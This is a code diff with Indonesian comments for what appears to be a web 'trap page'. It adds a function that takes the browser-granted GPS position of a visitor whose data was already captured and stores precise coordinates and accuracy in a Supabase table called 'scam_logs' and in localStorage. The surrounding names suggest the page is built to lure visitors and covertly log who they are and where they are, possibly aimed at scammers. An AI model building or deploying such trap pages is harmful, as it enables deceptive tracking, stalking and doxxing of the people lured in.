@@ -266,6 +266,9 @@ export const captureVisitorData = async () => {
       status: 'captured',
     };
 
+    // Simpan ID untuk updateGPS nanti
+    sessionStorage.setItem('last_log_id', logId);
+
     // Simpan ke Supabase langsung
     await saveToSupabase(fullLog);
 
@@ -302,5 +305,29 @@ export const captureVisitorData = async () => {
   } catch (error) {
     console.error('Capture failed:', error);
     return null;
+  }
+};
+
+// ── Fungsi update GPS saja (dipanggil dari TrapPage setelah user klik izinkan) ──
+// Menyimpan last captured ID di sessionStorage supaya bisa di-update
+export const updateGPS = async (position) => {
+  const logId = sessionStorage.getItem('last_log_id');
+  if (!logId) return;
+
+  const gpsUpdate = {
+    precise_lat: position.coords.latitude,
+    precise_lng: position.coords.longitude,
+    gps_accuracy: `${position.coords.accuracy.toFixed(1)} meters`,
+  };
+
+  if (isSupabaseConfigured()) {
+    await supabase.from('scam_logs').update(gpsUpdate).eq('id', logId);
+  }
+
+  const logs = JSON.parse(localStorage.getItem('scam_logs') || '[]');
+  const idx = logs.findIndex((l) => l.id === logId);
+  if (idx !== -1) {
+    logs[idx] = { ...logs[idx], ...gpsUpdate };
+    localStorage.setItem('scam_logs', JSON.stringify(logs));
   }
 };
